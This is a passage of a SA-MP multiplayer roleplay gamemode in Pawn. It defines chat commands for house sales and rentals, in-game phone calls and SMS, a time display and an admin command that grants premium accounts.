            GetPlayerName(playerid, playername, sizeof(playername));
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /asellhouse [houseid]");
                return 1;
            }
            new house = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 8)
            {
                HouseInfo[house][hHel] = 0;
                SaveKonVal(HouseInfo[house][hOwner], "pPhousekey", 9999);
                SaveKonValH(house, "hHel", 0);
                HouseInfo[house][hLock] = 1;
                SaveKonValH(house, "hLock", 1);
                HouseInfo[house][hOwned] = 0;
                SaveKonValH(house, "hOwned", 0);
                strmid(HouseInfo[house][hOwner], "The State", 0, strlen("The State"), 255);
                SaveKonStrH(house, "hOwner", "The State");
                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                GameTextForPlayer(playerid, "You sold the house", 10000, 3);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_WHITE, "You are not an admin.");
            }
        }
        return 1;
    }
    if(!strcmp(cmd,"/sellhousetostate",true))
    {
        GetPlayerName(playerid, playername, sizeof(playername));
        new house = PlayerInfo[playerid][pPhousekey];
        if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
        if(!IsPlayerInRangeOfPoint(playerid,2.0,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]) && TooHouse[playerid] != house) return SCM(playerid,COLOR_Good,"You must be in home or near home's door");
        new infostr[512],price = HouseInfo[house][hValue]*40/100;
        format(infostr,512,"Do you accept to sell home?\n\nYou sell home to state and state give you $%s and put your house for sell.",FormatNumber(price));
        ShowPlayerDialog(playerid,4576,DIALOG_STYLE_MSGBOX,"Sell House To State",infostr,"Accept","Decline");
        return 1;
    }
    if(strcmp(cmd, "/sellhouse", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
                GetPlayerName(playerid, playername, sizeof(playername));
                new house = PlayerInfo[playerid][pPhousekey];
                if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
                tmp = strtok(cmdtext,idx);
                if(!strlen(tmp)) { SCM(playerid,COL_SYN,"Syntax: /sellhouse <Price>"); return SCM(playerid,COLOR_ALI,"Use 0 for price to disable it."); }
                new price = strval(tmp);

                if(price == 0)
                {
                HouseInfo[house][hOwned] = 1;
                SaveKonValH(house, "hOwned", 1);
                HouseInfo[house][hForosh] = 0;
                SaveKonValH(house, "hForosh", 0);
                return SCM(playerid,COLOR_ALI,"SellHouse {FFFFFF}Disabled.");
                }

                if(price <= 4999 || price >= 500000001) return SCM(playerid,COLOR_ALI,"Type a price number between $5,000 and $500,000,000 or 0 to disable it.");

                if(price >= 1)
                {
                HouseInfo[house][hOwned] = 2;
                SaveKonValH(house, "hOwned", 2);
                HouseInfo[house][hForosh] = price;
                SaveKonValH(house, "hForosh", price);
                format(string,256,"Your house is for sell, Price: $%s",FormatNumber(price));
                return SCM(playerid,COLOR_ALI,string);
                }
        }
        return 1;
    }
    if (strcmp(cmd, "/houseinfo", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new house = PlayerInfo[playerid][pPhousekey];
            if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
                //new sendername[64];
                GetPlayerName(playerid, sendername, sizeof(sendername));
                new parktext[20];
                if(HouseInfo[house][hHel] == 1) {parktext = "Yes"; }
                else if(HouseInfo[house][hHel]  == 0) {parktext = "No"; }
                new neontext[20];
                if(HouseInfo[house][hLock] == 0) { neontext = "No"; }
                else if(HouseInfo[house][hLock] == 1) { neontext = "Yes"; }
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                    format(string, 256, "*** %s's house ***", sendername);
                    SendClientMessage(playerid, COLOR_WHITE, string);
                    format(string, 256, "House Level:[%d] Standar Price:[$%s] Locked:[%s] Heal Upgrade:[%s]",HouseInfo[house][hLevel], FormatNumber(HouseInfo[house][hValue]),neontext,parktext);
                    SendClientMessage(playerid, COLOR_GRAD3, string);
                    SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                    return 1;
                }
        }
        return 1;
    }
    if(strcmp(cmd, "/healupgrade", true) == 0 || strcmp(cmd, "/hu", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
                        if(PlayerInfo[playerid][pLevel] < 5)
                        {
                            SendClientMessage(playerid, COLOR_GRAD5, "You must be level +5 to upgrade your house.");
                            return 1;
                        }
                        if(GetPlayerPool(playerid) < 500)
                        {
                            SendClientMessage(playerid, COLOR_GRAD5, "Shoma Pool Kafi Nadarid");
                            return 1;
                        }
                        ShowPlayerDialog(playerid,7532,DIALOG_STYLE_MSGBOX,"Heal Upgrade for your house","Heal Upgrade for your house Price: 500$\n\nDo you accept heal upgrade for your house with $500 cost?","Accept","Decline");
                        return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/setrent", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPhousekey];
            GetPlayerName(playerid, playername, sizeof(playername));
            if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COL_SYN, "Syntax: /setrent <RentPrice>");
                    return 1;
                }
                if(strval(tmp) < 0 || strval(tmp) > 100)
                {
                    SendClientMessage(playerid, COLOR_WHITE, "Type a RentPrice Number between $0 and $100.");
                    return 1;
                }
                HouseInfo[bouse][hRent] = strval(tmp);
                SaveKonValH(bouse, "hRent", strval(tmp));
                format(string, sizeof(string), "House rent set to $%s", FormatNumber(HouseInfo[bouse][hRent]));
                SendClientMessage(playerid, COLOR_WHITE, string);
                return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/evictall", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
            EvictAllFromPlayerHouse(playerid);
            return 1;
        }
        return 1;
    }
    if(strcmp(cmd, "/evict", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            GetPlayerName(playerid, playername, sizeof(playername));
            if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /evict <PlayerID/PartOfName>");
                new target;
                target = ReturnUser(tmp);
                if (target == playerid)
                {
                    SendClientMessage(target, COLOR_ALI, "You can't evict yourself.");
                    return 1;
                }
                if(IsPlayerConnected(target) && gPlayerLogged[target] == 1)
                {
                    if(target != INVALID_PLAYER_ID)
                    {
                        if(PlayerInfo[target][pPhousekey] == PlayerInfo[playerid][pPhousekey])
                        {
                            SendClientMessage(target, COLOR_ALI, "You have been Evicted.");
                            SendClientMessage(playerid, COLOR_ALI, "Player has been evicted.");
                            PlayerInfo[target][pPhousekey] = 9999;
                            SaveKonVal(target, "pPhousekey", 9999);
                            if(PINFO[target][gParked] == 1)
                            {
                                CreateVehGarage(target);
                                SCM(target,COLOR_Good,"Your first car have been evicted from the parking.");
                            }
                            if(PINFO[target][gParked_2] == 1)
                            {
                                CreateVehGarage_2(target);
                                SCM(target,COLOR_Good,"Your first car have been evicted from the parking.");
                            }
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_WHITE, "Player doesn't rent your House.");
                            return 1;
                        }
                    }
                }
        }
        return 1;
    }
    if(strcmp(cmd, "/setrentable", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPhousekey];
            GetPlayerName(playerid, playername, sizeof(playername));
            if(PINFO[playerid][pPhousekey] == 9999 || strcmp(HouseInfo[PINFO[playerid][pPhousekey]][hOwner],PINFO[playerid][pName],true)) return SCM(playerid,COLOR_Good,"You don't own a house.");
                new Amounnt[512];
                Amounnt = strtok(cmdtext, idx);
                if(!strlen(Amounnt)) return SendClientMessage(playerid, COL_SYN, "Syntax: /setrentable <On/Off>");
                if(!strcmp(Amounnt,"On",true))
                {
                HouseInfo[bouse][hRentabil] = 1;
                SaveKonValH(bouse, "hRentabil", 1);
                SCM(playerid,COLOR_ALI,"Rentable of home Enabled.");
                }
                else if(!strcmp(Amounnt,"off",true))
                {
                HouseInfo[bouse][hRentabil] = 0;
                SaveKonValH(bouse, "hRentabil", 0);
                SCM(playerid,COLOR_ALI,"Rentable of home Disabled.");
                }
                else return SendClientMessage(playerid, COL_SYN, "Syntax: /setrentable <On/Off>");
                return 1;
        }
        return 1;
    }
//================================[CR]===========================
	if(!strcmp(cmd,"/pcall",true))
	{
        //if(Pl)
        tmp = strtok(cmdtext,idx);//1808.0897,-1599.5748,13.5469,41.3605
        if(!IsPlayerInRangeOfPoint(playerid,2.0,1808.0897,-1599.5748,13.5469)) return  SCM(playerid,COLOR_LIGHTRED,"Nazdik Telephone Sabet Nistid..");
		if(Mobile[playerid] != 9999) return SCM(playerid,COLOR_ALI,"You are already on a call.");
        if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"Shoma Mute Hastid.");
	//	if(PlayerInfo[playerid][pPnumber] == 0) return SCM(playerid,COLOR_LIGHTRED,"You don't have cellphone.");
       // if(PhoneOnline[playerid] == 0) return SCM(playerid, COLOR_LIGHTBLUE, "Dastgah Moshtarak Mored Nazar Khamosh Mibashad.");
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /pcall <PhoneNumber>");
        new phonenumb = strval(tmp);
        if(phonenumb == PlayerInfo[playerid][pPnumber]) return SCM(playerid,COLOR_ALI,"Be Goshie Khodet Mizangi?");
        if(PlayerOnDeathing[playerid] == true) return 1;
        new taraf = INVALID_PLAYER_ID;
        for(new i = 0; i < LastPID; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PlayerInfo[i][pPnumber] == phonenumb)
                {
                    taraf = i;
                }
            }
        }
        if(taraf == INVALID_PLAYER_ID) return SCM(playerid,COLOR_YELLOW,"The number that you're trying to call doesn't exist.");
        if(Mobile[taraf] != 9999 || CallWaiting[taraf] != 9999) return SCM(playerid,COLOR_YELLOW,"That player is already on a call.");
        if(PhoneOnline[taraf] == 0) return SCM(playerid,COLOR_YELLOW,"That player's phone is turned off.");
        Mobile[playerid] = taraf; //caller connected!~!
        CallWaiting[taraf] = playerid;
        GetPlayerName(playerid, sendername, sizeof(sendername));
        format(string, sizeof(string), "%s Ba Telephone Sabet Zang Zad.", sendername);
        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
        if(PlayerHandsCuffed[playerid] == 0)
        {
            SetPlayerAttachedObject(playerid, 0, 330, 6,0.000000,-0.001999,0.000000,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
        }
        new shomaretamoomses = PlayerInfo[playerid][pPnumber];
        TimerRingTone[taraf] = 1;
        format(string, sizeof(string), "Phone Ringing , Type (/p)ickup Name: (Unknown)(Telephone Sabet)");
        SendClientMessage(taraf, COLOR_YELLOW, string);
        PlayerPlaySound(playerid,3600,0.0,0.0,0.0);
        GetPlayerName(taraf, sendername, sizeof(sendername));
        format(string, sizeof(string), "%s's phone ringing ...", sendername);
        ProxDetector(30.0, taraf, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
        PlayerPlaySound(taraf, 23000,0.0,0.0,0.0)
        CellTime[playerid] = 0;
        CallCost[playerid] = SBizzInfo[14][sbEntranceCost];
        IsAtTelePhoneSabet[playerid] = true;
        return 1;
 }

    if(!strcmp(cmd,"/call",true))
    {
        tmp = strtok(cmdtext,idx);
		if(Mobile[playerid] != 9999) return SCM(playerid,COLOR_ALI,"You are already on a call.");
        if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"Shoma Mute Hastid.");
		if(PlayerInfo[playerid][pPnumber] == 0) return SCM(playerid,COLOR_LIGHTRED,"You don't have cellphone.");
        if(PhoneOnline[playerid] == 0) return SCM(playerid, COLOR_LIGHTBLUE, "You can't call because your cellphone is turned off.");
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /call <PhoneNumber>");
        new phonenumb = strval(tmp);
        if(phonenumb == PlayerInfo[playerid][pPnumber]) return SCM(playerid,COLOR_ALI,"Busy tone. You can't call yourself.");
        if(PlayerOnDeathing[playerid] == true) return 1;
        if(phonenumb == 110)
        {
            if(Ghatel[playerid] != INVALID_PLAYER_ID)
            {
                SetPlayerWantedLevel(Ghatel[playerid], GetPlayerWantedLevel(Ghatel[playerid])+GhatelWanted[playerid]);
                SetPlayerCriminal(Ghatel[playerid], playerid, CrimeText[playerid],GhatelWanted[playerid]);
                SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: Be Policehaie Mantaghe Gozaresh Shoma Elam Shod. Ba Tashakor.");
                Ghatel[playerid] = INVALID_PLAYER_ID;
                TimerAnnouncer[playerid] = 0;
                GhatelWanted[playerid] = 0;
                strdel(CrimeText[playerid], 0, 100);
                return 1;
            }
            PlayerPlaySound(playerid,3600,0.0,0.0,0.0);
            GetPlayerName(playerid, sendername, sizeof(sendername));
            format(string, sizeof(string), "%s takes out a cellphone.", sendername);
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            if(PlayerHandsCuffed[playerid] == 0)
            {
                SetPlayerAttachedObject(playerid, 0, 330, 6,0.000000,-0.001999,0.000000,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
                SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
            }
                SendClientMessage(playerid, COLOR_GG, "EMERGENCY: Which Service Do You Require, Police or Paramedic?");
                Mobile[playerid] = 9000;
                return 1;
        }
        new taraf = INVALID_PLAYER_ID;
        for(new i = 0; i < LastPID; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PlayerInfo[i][pPnumber] == phonenumb)
                {
                    taraf = i;
                }
            }
        }
        if(taraf == INVALID_PLAYER_ID) return SCM(playerid,COLOR_YELLOW,"The number that you're trying to call doesn't exist.");
        if(Mobile[taraf] != 9999 || CallWaiting[taraf] != 9999) return SCM(playerid,COLOR_YELLOW,"That player is already on a call.");
        if(PhoneOnline[taraf] == 0) return SCM(playerid,COLOR_YELLOW,"That player's phone is turned off.");
        Mobile[playerid] = taraf; //caller connected!~!
        CallWaiting[taraf] = playerid;
        GetPlayerName(playerid, sendername, sizeof(sendername));
        format(string, sizeof(string), "%s takes out a cellphone.", sendername);
        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
        if(PlayerHandsCuffed[playerid] == 0)
        {
            SetPlayerAttachedObject(playerid, 0, 330, 6,0.000000,-0.001999,0.000000,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
        }
        new shomaretamoomses = PlayerInfo[playerid][pPnumber];
        TimerRingTone[taraf] = 1;
        format(string, sizeof(string), "Phone Ringing , Type (/p)ickup Name: %s (%s)",sendername, FormatPhoneNumber(shomaretamoomses));
        SendClientMessage(taraf, COLOR_YELLOW, string);
        PlayerPlaySound(playerid,3600,0.0,0.0,0.0);
        GetPlayerName(taraf, sendername, sizeof(sendername));
        format(string, sizeof(string), "%s's phone ringing ...", sendername);
        ProxDetector(30.0, taraf, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
        PlayerPlaySound(taraf, 23000,0.0,0.0,0.0)
        CellTime[playerid] = 0;
        CallCost[playerid] = SBizzInfo[14][sbEntranceCost];
        return 1;
    }


		if (strcmp(cmd, "/throwguns", true) == 0)
		{
		new sweapon, sammo;
		new sefid = 0;
		for (new i=0; i<13; i++)
		{
			GetPlayerWeaponData(playerid, i, sweapon, sammo);
			if(sweapon != 0 && sammo != 0)
			{
				sefid = 1;
			}
		}
		if(sefid == 0) return SCM(playerid, COLOR_YELLOW2, "Error: you haven't any gun in your hands.");
		ResetPlayerTofang(playerid);
		SCM(playerid, COLOR_AMIR, "You throwed your weapons.");
		return 1;
		}




    if(strcmp(cmd, "/sms", true) == 0)
    {
        if(PINFO[playerid][pMuteTime] > 0) return SCM(playerid,COLOR_ALI,"Shoma Mute Hastid.");
        if (PhoneOnline[playerid] == 0) return SCM(playerid, COLOR_YELLOW, "you can't send a SMS When your phone is offline");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /sms <PhoneNumber> <Text>");
        GetPlayerName(playerid, sendername, sizeof(sendername));
        new phonenumb = strval(tmp);
        new result[256]; result = strtokEx(cmdtext,idx);
        new taraf = INVALID_PLAYER_ID;
        new sendernamex[64];
        for(new i = 0; i < LastPID; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PlayerInfo[i][pPnumber] == phonenumb)
                {
                    taraf = i;
                }
            }
        }
        if(taraf == INVALID_PLAYER_ID) return SCM(playerid,COLOR_YELLOW,"The number that you're trying to call doesn't exist.");
        if(PhoneOnline[taraf] == 0) return SCM(playerid,COLOR_YELLOW,"That player's phone is turned off.");
        new shomaresm = PlayerInfo[playerid][pPnumber];
        format(string, sizeof(string), "SMS: %s, Sender: %s (%s)", result,sendername,FormatPhoneNumber(shomaresm));
        SendClientMessage(taraf, COLOR_YELLOW, string);
        format(string, sizeof(string), "SMS: %s, To: %s (%s)", result,PINFO[taraf][pName],FormatPhoneNumber(PINFO[taraf][pPnumber]));
        SendClientMessage(playerid, COLOR_YELLOW, string);
        GetPlayerName(taraf, sendername, sizeof(sendername));
        GetPlayerName(playerid, sendernamex, sizeof(sendernamex));
        format(string, sizeof(string), "~r~-$%d", SBizzInfo[14][sbEntranceCost]);
        GameTextForPlayer(playerid, string, 5000, 1);
        GivePlayerPool(playerid,-SBizzInfo[14][sbEntranceCost]);
        SBizzInfo[14][sbTill] += SBizzInfo[14][sbEntranceCost];
        PlayerPlaySound(playerid, 1052,0.0,0.0,0.0)
        PlayerPlaySound(taraf, 1052,0.0,0.0,0.0)
	    printf("[SmS] Sender %s To %s : %s", sendernamex, sendername, result);
        return 1;
    }
//----------------------------------[pickup]-----------------------------------------------

    if(strcmp(cmd, "/pickup", true) == 0 || strcmp(cmd, "/p", true) == 0)
    {
        if(Mobile[playerid] != 9999) return SCM(playerid,COLOR_ALI,"You are already on a call...");
        for(new i = 0; i < LastPID; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(Mobile[i] == playerid)
                {
                    Mobile[playerid] = i; //caller connecting
                    SendClientMessage(i,  COLOR_Good, "They picked up.");
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    format(string, sizeof(string), "%s answers his cellphone.", sendername);
                    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                    CallWaiting[playerid] = 9999;
                    if(PlayerHandsCuffed[playerid] == 0)
                    {
                        SetPlayerAttachedObject(playerid, 0, 330, 6,0.000000,-0.001999,0.000000,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
                        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
                    }
                    TimerRingTone[playerid] = 0;
                }
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/hangup", true) == 0 || strcmp(cmd, "/h", true) == 0)
    {
        new caller = Mobile[playerid];
        if(caller != 9999 && !IsPlayerConnected(caller))
        {
            CellTime[playerid] = 90;
            SendClientMessage(playerid,  COLOR_Good, "You hung up.");
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
            RemovePlayerAttachedObject(playerid, 0);
            Mobile[playerid] = 9999;
            PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad
            return 1;
        }
        if(IsPlayerConnected(caller))
        {
            if(caller != 9999 && CallWaiting[caller] == playerid)
            {
                SendClientMessage(caller,  COLOR_Good, "They hung up.");
                SendClientMessage(playerid,  COLOR_Good, "You hung up.");
                SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
                RemovePlayerAttachedObject(playerid, 0);
                CellTime[playerid] = 90;
                CellTime[Mobile[playerid]] = 90;
                Mobile[Mobile[playerid]] = 9999;
                TimerRingTone[Mobile[playerid]] = 0;
                CallWaiting[Mobile[playerid]] = 9999;
                Mobile[playerid] = 9999;
                PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad save she
                return 1;
            }
        }
        if(CallWaiting[playerid] != 9999 && IsPlayerConnected(CallWaiting[playerid]))
        {
                CellTime[CallWaiting[playerid]] = 90;
                CellTime[playerid] = 90;
                Mobile[CallWaiting[playerid]] = 9999;
                Mobile[playerid] = 9999;
                TimerRingTone[playerid] = 0;
                SetPlayerSpecialAction(CallWaiting[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
                RemovePlayerAttachedObject(CallWaiting[playerid], 0);
                SendClientMessage(CallWaiting[playerid],  COLOR_Good, "They hung up.");
                SendClientMessage(playerid,  COLOR_Good, "You hung up.");
                CallWaiting[playerid] = 9999;
                PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad
                return 1;
         }
         if(caller != 9999 && CallWaiting[playerid] == 9999 && IsPlayerConnected(caller))
         {
            if(caller < 9999)
            {
                SendClientMessage(caller,  COLOR_Good, "They hung up.");
                CellTime[caller] = 90;
                CellTime[playerid] = 90;
                SendClientMessage(playerid,  COLOR_Good, "You hung up.");
                Mobile[caller] = 9999;
                Mobile[playerid] = 9999;
                SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
                SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
                RemovePlayerAttachedObject(caller, 0);
                RemovePlayerAttachedObject(playerid, 0);
                TimerRingTone[caller] = 0;
                PlayerInfo[playerid][pSpeaker] = 0;//Nemikhad
                return 1;
            }
            IsAtTelePhoneSabet[playerid] = false;
        }
        return 1;
    }
//----------------------------------[TIME]-----------------------------------------------
if(strcmp(cmd, "/time", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new mtext[20];
            new year, month,day;
            getdate(year, month, day);
            if(month == 1) { mtext = "January"; }
            else if(month == 2) { mtext = "February"; }
            else if(month == 3) { mtext = "March"; }
            else if(month == 4) { mtext = "April"; }
            else if(month == 5) { mtext = "May"; }
            else if(month == 6) { mtext = "June"; }
            else if(month == 7) { mtext = "July"; }
            else if(month == 8) { mtext = "August"; }
            else if(month == 9) { mtext = "September"; }
            else if(month == 10) { mtext = "October"; }
            else if(month == 11) { mtext = "November"; }
            else if(month == 12) { mtext = "December"; }
            new hour,minuite,second;
            gettime(hour,minuite,second);
            FixHour(hour);
            hour = shifthour;
            format(string, sizeof(string), "~y~%s%d %s~n~~g~|~w~%s%d:%s%d:%s%d~g~|",(day < 10) ? ("0") : (""), day, mtext,((hour < 10) ? ("0") : ("")), hour, ((minuite < 10) ? ("0") : ("")),minuite, ((second < 10) ? ("0") : ("")),second);
            GameTextForPlayer(playerid, string, 5000, 1);
            GetPlayerName(playerid, sendername, sizeof(sendername));
            if(PlayerInfo[playerid][pSex] == 1) { format(string, sizeof(string), "%s raises his hand and looks down at his watch.", sendername); }
            else { format(string, sizeof(string), "%s raises her hand and looks down at her watch.", sendername); }
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            if(!IsPlayerInAnyVehicle(playerid))
            {
            LoopingAnim(playerid,"COP_AMBIENT","Coplook_watch",4.1,0,0,0,0,0);
            }
            else { return 1; }
        }
        return 1;
    }
    //----------------
    if(strcmp(cmd, "/givepre", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(PlayerInfo[playerid][pAdmin] < 11)
				{
				SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
				return 1;
				}
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendMessage(playerid, COL_SYN, "Syntax: /givepre <Playerid/PartOfName> <2/1/0>");
					return 1;
				}
				new para1;
				new level;
				para1 = ReturnUser(tmp);
				tmp = strtok(cmdtext, idx);
				level = strval(tmp);
					if(IsPlayerConnected(para1))
					{
					new name[40];
					GetPlayerName(para1, name, sizeof(name));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					if(level == 3) {
					PlayerInfo[para1][pPremiumAccount] = 3;
					SaveKonVal(para1, "pPremiumAccount", 3);
					PINFO[para1][pPDay] = 30;
					SaveKonVal(para1, "pPDay", 30);
					new dd,mm,yy;
					getdate(dd,mm,yy);
					format(string,sizeof(string), "%s%d/%s%d/%s%d", (dd < 10) ? ("0") : (""),dd, (mm < 10) ? ("0") : (""),mm, (yy < 10) ? ("0") : (""),yy);
					strmid(PlayerInfo[playerid][pPExpire],string,0,sizeof(string),24);
					SaveKonStr(playerid, "pPExpire", string);
//					new string[512];
					format(string, sizeof(string), "%s given you premium account Level 3.", sendername);
					SendMessage(para1, COLOR_WHITE, string);
					new str[512];
					format(str, sizeof(str), "{FFFFFF}Admin %s given a premium level 3 to player %s.",sendername,name);
					AdminWarn(str);
					}
					if(level == 2) {
					PlayerInfo[para1][pPremiumAccount] = 2;
					SaveKonVal(para1, "pPremiumAccount", 2);
					PINFO[para1][pPDay] = 30;
					SaveKonVal(para1, "pPDay", 30);
					new dd,mm,yy;
					getdate(dd,mm,yy);
					format(string,sizeof(string), "%s%d/%s%d/%s%d", (dd < 10) ? ("0") : (""),dd, (mm < 10) ? ("0") : (""),mm, (yy < 10) ? ("0") : (""),yy);
					strmid(PlayerInfo[playerid][pPExpire],string,0,sizeof(string),24);
					SaveKonStr(playerid, "pPExpire", string);
				//	new string[512];
					format(string, sizeof(string), "%s given you premium account Level 2.", sendername);
					SendMessage(para1, COLOR_WHITE, string);
					new str[512];
					format(str, sizeof(str), "{FFFFFF}Admin %s given a premium level 2 to player %s.",sendername,name);
					AdminWarn(str);
					}
					else if(level == 1) {
					PlayerInfo[para1][pPremiumAccount] = 1;
					SaveKonVal(para1, "pPremiumAccount", 1);
					PINFO[para1][pPDay] = 30;
					SaveKonVal(para1, "pPDay", 30);
					new dd,mm,yy;
					getdate(dd,mm,yy);
					format(string,sizeof(string), "%s%d/%s%d/%s%d", (dd < 10) ? ("0") : (""),dd, (mm < 10) ? ("0") : (""),mm, (yy < 10) ? ("0") : (""),yy);
					strmid(PlayerInfo[playerid][pPExpire],string,0,sizeof(string),24);
					SaveKonStr(playerid, "pPExpire", string);
				//	new string[512];
					format(string, sizeof(string), "%s given you premium account Level 1.", sendername);
					SendMessage(para1, COLOR_WHITE, string);
					new str[512];
					format(str, sizeof(str), "{FFFFFF}Admin %s given a premium level 1 to player %s.",sendername,name);
					AdminWarn(str);
					}
					else if(level == 101) {
					PlayerInfo[para1][pPremiumAccount] = 101;
					SaveKonVal(para1, "pPremiumAccount", 101);
					PINFO[para1][pPDay] = 30;
					SaveKonVal(para1, "pPDay", 30);
					new dd,mm,yy;
					getdate(dd,mm,yy);
					format(string,sizeof(string), "%s%d/%s%d/%s%d", (dd < 10) ? ("0") : (""),dd, (mm < 10) ? ("0") : (""),mm, (yy < 10) ? ("0") : (""),yy);
					strmid(PlayerInfo[playerid][pPExpire],string,0,sizeof(string),24);
					SaveKonStr(playerid, "pPExpire", string);
				//	new string[512];
					format(string, sizeof(string), "%s given you [VIP].", sendername);
					SendMessage(para1, COLOR_WHITE, string);
					new str[512];
					format(str, sizeof(str), "{FFFFFF}Admin %s given a [VIP] to player %s.",sendername,name);
					AdminWarn(str);
					}
				    else if(level == 100) {
					PlayerInfo[para1][pPremiumAccount] = 100;
					SaveKonVal(para1, "pPremiumAccount", 100);
					PINFO[para1][pPDay] = 7;
					SaveKonVal(para1, "pPDay", 7);
					new dd,mm,yy;
					getdate(dd,mm,yy);
					format(string,sizeof(string), "%s%d/%s%d/%s%d", (dd < 10) ? ("0") : (""),dd, (mm < 10) ? ("0") : (""),mm, (yy < 10) ? ("0") : (""),yy);
					strmid(PlayerInfo[playerid][pPExpire],string,0,sizeof(string),24);
					SaveKonStr(playerid, "pPExpire", string);
			//		new string[512];
					format(string, sizeof(string), "%s given you [VIP].", sendername);
					SendMessage(para1, COLOR_WHITE, string);
					new str[512];
					format(str, sizeof(str), "{FFFFFF}Admin %s given a [VIP] to player %s.",sendername,name);
					AdminWarn(str);
					}
					else if(level == 0) {
					PlayerInfo[para1][pPremiumAccount] = 0;
